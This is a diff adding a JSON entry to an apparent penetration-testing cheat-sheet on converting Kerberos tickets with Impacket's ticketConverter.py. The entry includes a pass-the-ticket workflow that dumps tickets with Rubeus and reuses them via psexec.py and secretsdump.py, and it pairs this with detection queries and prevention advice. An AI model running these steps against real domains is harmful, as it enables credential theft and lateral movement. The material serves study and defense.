@@ -1,0 +1,79 @@
+{
+  "id": "ad-ticketconverter",
+  "name": "ticketConverter.py - Kerberos Ticket Format Conversion",
+  "command": "python3 ticketConverter.py <input_ticket>.kirbi <output_ticket>.ccache",
+  "description": "Impackets ticketConverter converts Kerberos tickets between formats: kirbi (Windows/Mimikatz/Rubeus format) to ccache (Linux/Impacket format) and vice versa. Essential for cross-platform attack chains where you extract a ticket on Windows and need to use it on Linux, or vice versa.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "silent",
+  "category": "Active Directory",
+  "subcategory": "Lateral Movement",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CPTS",
+  "source": "Impacket/ticketConverter.py; cross-platform AD attacks",
+  "tags": [
+    "ticketconverter",
+    "impacket",
+    "kirbi",
+    "ccache",
+    "kerberos",
+    "ticket-conversion",
+    "cross-platform"
+  ],
+  "mitre": [
+    "T1550.003"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== KIRBI TO CCACHE (Windows -> Linux) ===\n  python3 ticketConverter.py admin.kirbi admin.ccache\n  export KRB5CCNAME=admin.ccache\n  python3 psexec.py -k -no-pass <domain>/administrator@<target>\n\n=== CCACHE TO KIRBI (Linux -> Windows) ===\n  python3 ticketConverter.py admin.ccache admin.kirbi\n  # Import on Windows with Rubeus:\n  Rubeus.exe ptt /ticket:<base64_of_kirbi>\n\n=== COMMON WORKFLOW ===\n  # 1. Extract ticket on Windows (Rubeus)\n  Rubeus.exe dump /nowrap\n  # Save base64 to file, decode:\n  base64 -d ticket.b64 > ticket.kirbi\n\n  # 2. Convert to ccache\n  python3 ticketConverter.py ticket.kirbi ticket.ccache\n\n  # 3. Use on Linux\n  export KRB5CCNAME=ticket.ccache\n  python3 secretsdump.py -k -no-pass <dc_fqdn>\n\n=== DECODE BASE64 TICKET ===\n  # From Rubeus output (base64 encoded kirbi):\n  echo \"<base64_ticket>\" | base64 -d > ticket.kirbi\n  # Then convert:\n  python3 ticketConverter.py ticket.kirbi ticket.ccache",
+  "examples": [
+    {
+      "label": "Convert kirbi to ccache",
+      "command": "python3 ticketConverter.py admin.kirbi admin.ccache"
+    },
+    {
+      "label": "Convert ccache to kirbi",
+      "command": "python3 ticketConverter.py admin.ccache admin.kirbi"
+    },
+    {
+      "label": "Full cross-platform workflow",
+      "command": "echo \"<base64_ticket>\" | base64 -d > ticket.kirbi && python3 ticketConverter.py ticket.kirbi ticket.ccache && export KRB5CCNAME=ticket.ccache"
+    }
+  ],
+  "references": [
+    {
+      "title": "Impacket - ticketConverter.py",
+      "url": "https://github.com/fortra/impacket"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "rubeus-ptt",
+      "note": "Rubeus extracts tickets on Windows; ticketConverter moves them to Linux.",
+      "rel": "prereq"
+    },
+    {
+      "id": "ptt-linux",
+      "note": "Use converted ccache tickets with Impacket tools on Linux.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "Kerberos tickets are protocol-level tokens that are valid regardless of the platform they are used from. Converting between formats allows attackers to leverage tickets extracted on one OS from another.",
+    "prerequisites": "A valid Kerberos ticket in either kirbi or ccache format.",
+    "impact": "Cross-platform ticket reuse; enables using Windows-extracted tickets from Linux attack tools.",
+    "detection": "[MITRE T1550.003] Ticket use from unexpected platforms; Kerberos authentication from non-Windows clients for Windows services.",
+    "artifacts": "Event 4769 (TGS request) from Linux IP addresses; unusual client OS in Kerberos authentication.",
+    "splunk_spl": "index=windows EventCode=4769\n| where NOT match(IpAddress, \"10\\.10\\.\") AND IpAddress!=\"127.0.0.1\"\n| table _time, TargetUserName, ServiceName, IpAddress",
+    "elastic_kql": "event.code:\"4769\" AND source.ip:*",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 4769\n| project TimeGenerated, TargetUserName, ServiceName, IpAddress, TicketEncryptionType",
+    "sigma_rules": "win_security_kerberos_ticket_cross_platform",
+    "prevention": "Monitor for Kerberos authentication from unexpected source IPs; use Protected Users group; implement PAC validation.",
+    "sources": [
+      "Impacket documentation",
+      "https://attack.mitre.org/techniques/T1550/003/"
+    ]
+  }
+}
